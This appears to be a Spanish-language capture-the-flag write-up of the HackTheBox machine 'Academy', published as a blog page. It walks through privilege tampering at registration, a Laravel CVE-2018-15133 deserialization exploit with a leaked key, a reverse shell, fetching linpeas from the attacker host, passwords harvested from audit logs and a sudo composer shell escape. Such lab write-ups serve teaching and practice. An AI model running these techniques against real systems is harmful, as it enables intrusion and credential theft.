@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Academy</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Academy | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Academy" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel fácil. Pensaremos en bases de datos (eh?), deserializaremos mentes :o, jugaremos con archivos ‘log’ y romperemos un binario que nos dará en este caso dependencia de ser dueños del sistema :P" />
+<meta property="og:description" content="Máquina Linux nivel fácil. Pensaremos en bases de datos (eh?), deserializaremos mentes :o, jugaremos con archivos ‘log’ y romperemos un binario que nos dará en este caso dependencia de ser dueños del sistema :P" />
+<link rel="canonical" href="http://localhost:4000/htb/academy" />
+<meta property="og:url" content="http://localhost:4000/htb/academy" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-27T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297banner.png" />
+<meta property="twitter:title" content="HackTheBox - Academy" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-02-27T00:00:00-08:00","datePublished":"2021-02-27T00:00:00-08:00","description":"Máquina Linux nivel fácil. Pensaremos en bases de datos (eh?), deserializaremos mentes :o, jugaremos con archivos ‘log’ y romperemos un binario que nos dará en este caso dependencia de ser dueños del sistema :P","headline":"HackTheBox - Academy","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/academy"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/academy"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Academy</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-02-27">27 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297banner.png" alt="HackTheBox - Academy">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel fácil. Pensaremos en bases de datos (eh?), deserializaremos mentes :o, jugaremos con archivos ‘log’ y romperemos un binario que nos dará en este caso dependencia de ser dueños del sistema :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297academyHTB.png" alt="297academyHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creadores</strong>: <a href="https://www.hackthebox.eu/profile/1190">egre55</a> &amp; <a href="https://www.hackthebox.eu/profile/2984">mrb3n</a>.</p>
+
+<p><strong>Este writeup lo hice después de haber resuelto la máquina, por lo tanto (quizás) iré muy directo :P</strong></p>
+
+<p>Holas, como tas?</p>
+
+<p>Bueno, empezaremos con un panel algo juguetón en el cual nos registraremos, asignándonos un rol distinto al que tiene por defecto, con él haremos que nuestro usuario se pueda logear en otro recurso solo para administradores e.e Conseguiremos un nuevo dominio en el que encontramos muchos errores :( de los cuales nos aprovecharemos de uno que explota una mala <code>deserialización</code> para conseguir una Shell como <code>www-data</code> :)</p>
+
+<p>Ya estando dentro simplemente enumerando conseguiremos unas credenciales para migrarnos al usuario <code>cry0l1t3</code>, con él obtendremos la flag <code>user.txt</code>. Este usuario cuenta con el grupo <code>adm</code>, lo usaremos para enfocarnos en los archivos <code>log</code> del sistema u.u</p>
+
+<p>Dando unas vueltas por internet y en la máquina, finalmente encontramos una herramienta que se complementa con los archivos <code>log</code> para conseguir las credenciales del usuario <code>mrb3n</code>, nos migraremos a él.</p>
+
+<p>Con enumeración básica nos daremos cuenta de que <code>mrb3n</code> puede ejecutar <code>/usr/bin/composer</code> en el sistema con permisos de adminstrador… Nos veremos forzados :P a usar esto para conseguir una Shell en el sistema como usuario <code>root</code>… A darle candela ;)</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina.</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Enumeración pa rato y con tintes de realidad.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Empezamos realizando un escaneo de puertos para saber que servicios esta corriendo.</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v 10.10.10.215 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat initScan 
+# Nmap 7.80 scan initiated Wed Jan 13 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.215
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.215 ()   Status: Up
+Host: 10.10.10.215 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 33060/open/tcp//mysqlx///
+# Nmap done at Wed Jan 13 25:25:25 2021 -- 1 IP address (1 host up) scanned in 114.32 seconds
+</code></pre>
+
+<p>Muy bien, ¿que tenemos?</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Conexion remota segura mediante una shell</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong>: Protocolo que permite la comunicación y transferencia de info a traves de la web</td>
+    </tr>
+    <tr>
+      <td>33060</td>
+      <td style="text-align: left"><strong><a href="https://dev.mysql.com/doc/dev/mysqlsh-api-python/8.0/group__mysqlx.html">mysqlx</a></strong>: “MySQL Shell API”</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:</p>
+
+<pre><code class="language-bash">–» nmap -p 22,80,33060 -sC -sV 10.10.10.215 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat portScan
+# Nmap 7.80 scan initiated Wed Jan 13 25:25:25 2021 as: nmap -p 22,80,33060 -sC -sV -oN portScan 10.10.10.215
+Nmap scan report for 10.10.10.215                                                               
+Host is up (0.20s latency).                                                                     
+                                                                                                
+PORT      STATE SERVICE VERSION                                                                 
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))                    
+|_http-server-header: Apache/2.4.41 (Ubuntu)                                                    
+|_http-title: Did not follow redirect to http://academy.htb/              
+33060/tcp open  mysqlx?                                                                         
+| fingerprint-strings:                                                                          
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"                                                                          
+|_    HY000                                                                                     
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.80%I=7%D=1/13%Time=5FFF22AB%P=x86_64-pc-linux-gnu%r(N
+...
+SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan 13 25:25:25 2021 -- 1 IP address (1 host up) scanned in 44.18 seconds
+</code></pre>
+
+<p>Tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.41</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">33060</td>
+      <td style="text-align: left">mysqlx</td>
+      <td style="text-align: left">mysqlx (pero no estamos seguros)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>…</p>
+
+<h3 id="puerto-8080">Puerto 8080 <a href="#puerto-8080">⌖</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80.png" alt="297page80" /></p>
+
+<p>Podemos crearnos una cuenta o logearnos, creémonos una a ver con que nos encontramos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_register.png" alt="297page80_register" /></p>
+
+<p>Y ahora ingresamos mediante el <code>login</code>… Estando dentro tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_home.png" alt="297page80_home" /></p>
+
+<p>Varios módulos con temas de aprendizaje, aunque ninguno redirecciona a ningún lado :P Haciendo algo de fuzzing nos encontramos con la página <code>admin.php</code> que es otro login:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_adminLogin.png" alt="297page80_adminLogin" /></p>
+
+<p>Pero con nuestras credenciales no podemos ingresar…</p>
+
+<p>Después de dar vueltas nos damos cuenta de algo interesante al momento de crear la cuenta:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_register_hiddenInput.png" alt="297page80_register_hiddenInput" /></p>
+
+<p>Un <code>input</code> escondido con valor por defecto <code>0</code> que además su nombre es <code>role_id</code>… Si recordamos por un momento las bases de datos, donde los usuarios son guardados a veces con <code>id</code> y donde el número <code>1</code> es generalmente el <code>administrador</code>. Nos da una idea que podemos probar a cambiar el valor a <code>1</code> y después probar en los logins que tenemos a ver si cambia algo…</p>
+
+<p>Hacemos el mismo proceso de creación de cuenta solo que ahora nos apoyamos mediante <code>CTRL + SHIFT + I</code> para ver el inspector de código y así cambiar el valor del input:</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_register_newID.png" alt="297page80_register_newID" /></p>
+
+<p>Validando, no hay cambio (a simple vista) en la web donde tenemos todos los módulos, pero en la de <code>admin.php</code> obtenemos algo nuevo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_adminLogin_done.png" alt="297page80_adminLogin_done" /></p>
+
+<p>Perfecto, tamos dentro del login como usuario administrador… Nos topamos con unos ítems a hacer, entre ellos el ultimo esta pendiente: (Arreglar problema con <code>dev-staging-01.academy.htb</code>), por lo tanto agreguemos ese dominio al <code>/etc/hosts</code> y veamos que tiene:</p>
+
+<pre><code class="language-bash">–» cat /etc/hosts
+...
+10.10.10.215  academy.htb dev-staging-01.academy.htb
+...
+</code></pre>
+
+<p>Ponemos en la web ese dominio yyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_dev_staging_01.png" alt="297page80_dev_staging_01" /></p>
+
+<p>Vale, vale, valeeeeeee, tenemos muchos errores relacionados con el framework <code>Laravel</code> :P Y también alguna data interesante:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_dev_staging_01_details1.png" alt="297page80_dev_staging_01_details1" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297page80_dev_staging_01_details2.png" alt="297page80_dev_staging_01_details2" /></p>
+
+<p>Tenemos cositas interesantes, como rutas, posibles usuarios, servicios, el PATH y algo llamado <code>APP_KEY</code>, que parece algo interesante, pero no lo sabemos aún, ahora nos queda leer los errores, extraer rutas interesantes y buscarlas en internet, quizás alguna tenga su CVE o exploit relacionado…</p>
+
+<p>Después de algo de búsqueda exhaustiva (: encontramos este exploit:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297google_foundCVE2018_15133.png" alt="297google_foundCVE2018_15133" /></p>
+
+<p>Que no cubre toda la búsqueda, pero involucra <code>Illuminate</code> que es uno de los servicios que estamos corriendo… Leyendo sobre el exploit, explota el CVE <code>CVE-2018-15133</code> y el <code>CVE-2017-16894</code>. Basicamente se aprovecha de una brecha en el framework <code>laravel</code> (vamos bien) donde al momento de llamar el método <code>Illuminate/Encryption/Encrypter.php</code> se puede producir una deserializacion insegura, en la que podemos ejecutar comandos en el sistema antes de que nos muestre algún error. No requerimos autenticación, pero si el token <code>API_KEY</code> (perfe, lo tenemos) para poder aprovecharnos… Este exploit es un módulo de <code>metasploit</code>, busquemos en internet algún PoC sobre <code>CVE-2018-15133</code>.</p>
+
+<ul>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-15133">CVE-2018-15133 - nvd.nist.gov/CVE-2018-15133</a>.</li>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133">CVE-2018-15133 - cve.mitre.org/CVE-2018-15133</a>.</li>
+</ul>
+
+<p>Con algo de suerte, pero también deseando no haberla tenido, encontramos este exploit relacionado con el <code>CVE-2018-15133</code>:</p>
+
+<ul>
+  <li><a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133">Exploit Laravel CVE-2018-15133 - github.com/aljavier</a>.</li>
+</ul>
+
+<p>En su descripción dice que hizo el script enfocado en una máquina de <code>HackTheBox</code> . _. ya que no quería usar <code>metasploit</code> y quería practicar su scripting :P</p>
+
+<p>Y también en las imágenes nos muestra como se debe usar, donde el <code>API_KEY</code> es el mismo que tenemos nosotros :I Y bueno, que se le hace, desearía que hubiera sido mucho más implícito, pero pues una vez lo vez, ya paila, a usarlo y seguir:</p>
+
+<p>Nos bajamos el script y su uso es sencillo:</p>
+
+<pre><code class="language-bash">–» python3 pwn_laravel.py 
+usage: pwn_laravel.py [-h] [-c COMMAND] [-m {1,2,3,4}] [-i] URL API_KEY
+pwn_laravel.py: error: the following arguments are required: URL, API_KEY
+</code></pre>
+
+<pre><code class="language-bash">–» python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c whoami
+www-data
+</code></pre>
+
+<p>Bien, tenemos ejecución de comandos en el sistema, intentemos generar una reverse Shell (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297bash_CVE2018_15133_revsh.png" alt="297bash_CVE2018_15133_revsh" /></p>
+
+<p>Listos, tamos dentro, hagamos de nuestra Shell una totalmente interactiva, ya que con la que tenemos estamos limitados, no podemos ver los comandos anteriormente ingresados, no podemos hacer <code>CTRL + C</code>, así que hagamos tratamiento de la TTY:</p>
+
+<pre><code class="language-bash">www-data@academy:/var/www/html/htb-academy-dev-01/public$ script /dev/null -c bash
+# Ahora CTRL + Z (acá volvemos a nuestra máquina de atacante)
+# Escribimos lo siguiente:
+–» stty raw -echo
+–» fg (aunque no se vea cuando lo coloquemos, si se está escribiendo, damos enter)
+# Nos retornará a lo que teníamos detenido, solo debemos escribir: reset
+–» nc -lvp 4433
+               reset
+reset: unknown terminal type unknown
+# Y después: xterm
+Terminal type? xterm
+</code></pre>
+
+<p>En ejecución se veria asi:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297bash_revSH_tty1.png" alt="297bash_revSH_tty1" /></p>
+
+<p>Y por ultimo indicamos:</p>
+
+<pre><code class="language-bash">www-data@academy:/var/www/html/htb-academy-dev-01/public$ export TERM=xterm
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ export SHELL=bash
+www-data@academy:/var/www/html/htb-academy-dev-01/public$ stty rows 43 columns 192 (Esto es para contar con toda la pantalla, depende de la pantalla de cada uno, para verificar abran una terminal y escriban `stty -a`, ahí salen las filas y columnas. El mejor ejemplo del uso de esto es corriendo `nano` antes de ejecutar esta línea)
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297bash_revSH_tty1.png" alt="297bash_revSH_nanoproblem" /></p>
+
+<p>Ejecutamos la linea:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297bash_revSH_nanodone.png" alt="297bash_revSH_nanodone" /></p>
+
+<p>En este recurso s4vitar lo explica en un video:</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">S4vitar explicando como hacer tratamiento de la TTY</a>.</li>
+</ul>
+
+<p>Ahora si, sigamos:</p>
+
+<pre><code class="language-bash">www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls -la /home/
+total 32
+drwxr-xr-x  8 root     root     4096 Aug 10 00:34 .
+drwxr-xr-x 20 root     root     4096 Aug  7 12:07 ..
+drwxr-xr-x  2 21y4d    21y4d    4096 Aug 10 00:34 21y4d
+drwxr-xr-x  2 ch4p     ch4p     4096 Aug 10 00:34 ch4p
+drwxr-xr-x  6 cry0l1t3 cry0l1t3 4096 Jan 13 01:36 cry0l1t3
+drwxr-xr-x  3 egre55   egre55   4096 Aug 10 23:41 egre55
+drwxr-xr-x  2 g0blin   g0blin   4096 Aug 10 00:34 g0blin
+drwxr-xr-x  7 mrb3n    mrb3n    4096 Jan 13 01:25 mrb3n
+</code></pre>
+
+<p>Varios usuarios en el sistema, vemos dos que han sido actualizados hace poco, <code>cry0l1t3</code> y <code>mrb3n</code>. La bandera <code>user.txt</code> está en el usuario <code>cry0l1t3</code>, vemos como escalar a él…</p>
+
+<p>Subiendo el script de enumeración <code>linpeas.sh</code> a la máquina y ejecutándolo conseguimos una contraseña:</p>
+
+<pre><code class="language-bash">–» python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<pre><code class="language-bash">www-data@academy:/dev/shm$ wget http://10.10.14.141:8000/linpeas.sh
+www-data@academy:/dev/shm$ chmod +x linpeas.sh
+www-data@academy:/dev/shm$ ./linpeas.sh
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/academy/297bash_revSH_foundCreds.png" alt="297bash_revSH_foundCreds" /></p>
+
+<p>Tenemos en el archivo <code>/var/www/html/academy/.env</code> una contraseña. Pues, ya que estamos probemos con alguno de los usuarios a ver si se nos permite el login:</p>
+
+<pre><code class="language-bash">www-data@academy:/dev/shm$ ls /home/
+21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
+www-data@academy:/dev/shm$ su 21y4d
+Password: 
+su: Authentication failure
+www-data@academy:/dev/shm$ su ch4p
+Password: 
+su: Authentication failure
+www-data@academy:/dev/shm$ su cry0l1t3
+Password: 
+$ id
+uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
+$ 
+</code></pre>
+
+<p>Perfectoo, ahora… A seguir enumerando.</p>
+
+<pre><code class="language-bash">$ script /dev/null -c bash
+Script started, file is /dev/null
+cry0l1t3@academy:/dev/shm$ 
+</code></pre>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>El usuario <code>cry0l1t3</code> está asignado al grupo <code>adm</code> que en pocas palabras permite ver los archivos <code>/var/log/*</code> de la máquina. Veamos si eso es algo importante, corramos de nuevo el script <code>linpeas.sh</code> a ver si obtenemos algo nuevo con base en los archivos <code>log</code>.</p>
+
+<ul>
+  <li><a href="https://wiki.debian.org/SystemGroups#Groups_without_an_associated_user">Info sobre el grupo <strong>adm</strong> y otros</a>.</li>
+</ul>
+
+<blockquote>
+  <p>Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. <a href="https://wiki.debian.org/SystemGroups#Groups_without_an_associated_user">wiki.debian.org/SystemGroups</a></p>
+</blockquote>
+
+<p>Corriendo <code>linpeas.sh</code> no obtenemos nada nuevo, buscando por internet como aprovecharnos de los archivos <code>log</code> di con este artículo:</p>
+
+<ul>
+  <li><a href="https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/">Logging password on linux - redsiege.com</a>.</li>
+</ul>
+
+<p>El cual habla de <a href="https://wiki.archlinux.org/index.php/PAM_(Espa%C3%B1ol)">como</a> los usuarios que efectúan <code>su/sudo</code> en el sistema, dejan sus credenciales grabadas en el archivo <code>/var/log/audit/audit.log</code></p>
+
+<blockquote>
+  <p>You can view the audit log with <code>aureport --tty</code>.</p>
+</blockquote>
+
+<p>Si lo ejecutamos, tenemos:</p>
+
+<pre><code class="language-bash">cry0l1t3@academy:/dev/shm$ aureport --tty
+
+TTY Report
+===============================================
+# date time event auid term sess comm data
+===============================================
+Error opening config file (Permission denied)
+NOTE - using built-in logs: /var/log/audit/audit.log
+1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",&lt;nl&gt;
+2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",&lt;nl&gt;
+3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",&lt;nl&gt;
+4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",&lt;nl&gt;
+5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",&lt;nl&gt;
+...
+...
+</code></pre>
+
+<p>Bien, obtenemos unas posibles credenciales del usuario <code>mrb3n</code>, validemoslas:</p>
+
+<pre><code class="language-bash">cry0l1t3@academy:/dev/shm$ su mrb3n
+Password: 
+$ id
+uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
+$ 
+</code></pre>
+
+<p>Nice, pues veamos para qué queremos ser el usuario <code>mrb3n</code> en el sistema…</p>
+
+<p>Después de enumerar y no enumerar lo básico :P encontramos esto:</p>
+
+<pre><code class="language-bash">$ script /dev/null -c bash
+Script started, file is /dev/null
+mrb3n@academy:/dev/shm$ sudo -l
+[sudo] password for mrb3n: 
+Matching Defaults entries for mrb3n on academy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mrb3n may run the following commands on academy:
+    (ALL) /usr/bin/composer
+mrb3n@academy:/dev/shm$ 
+</code></pre>
+
+<p>Nos indica que podemos ejecutar <code>/usr/bin/composer</code> con permisos de administrador indicándole <code>sudo</code> al inicio, pues busquemos como podemos explotar ese binario…</p>
+
+<p>Si nos vamos al siempre confiable <a href="https://gtfobins.github.io/">GTFOBins</a> (que tiene un gran compilado de binarios que pueden ser usados para saltarse algunos métodos de seguridad en el sistema), encontramos <a href="https://gtfobins.github.io/gtfobins/composer/">composer</a> y una manera de obtener una Shell en el sistema:</p>
+
+<ul>
+  <li><a href="https://gtfobins.github.io/gtfobins/composer/">GTFOBins exploiting composer bin - gtfobins.github.io/composer</a>.</li>
+</ul>
+
+<p>En la máquina escribimos:</p>
+
+<pre><code class="language-bash">mrb3n@academy:/dev/shm$ TF=$(mktemp -d)
+mrb3n@academy:/dev/shm$ echo '{"scripts":{"x":"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"}}' &gt;$TF/composer.json
+mrb3n@academy:/dev/shm$ sudo /usr/bin/composer --working-dir=$TF run-script x
+PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
+Do not run Composer as root/super user! See https://getcomposer.org/root for details
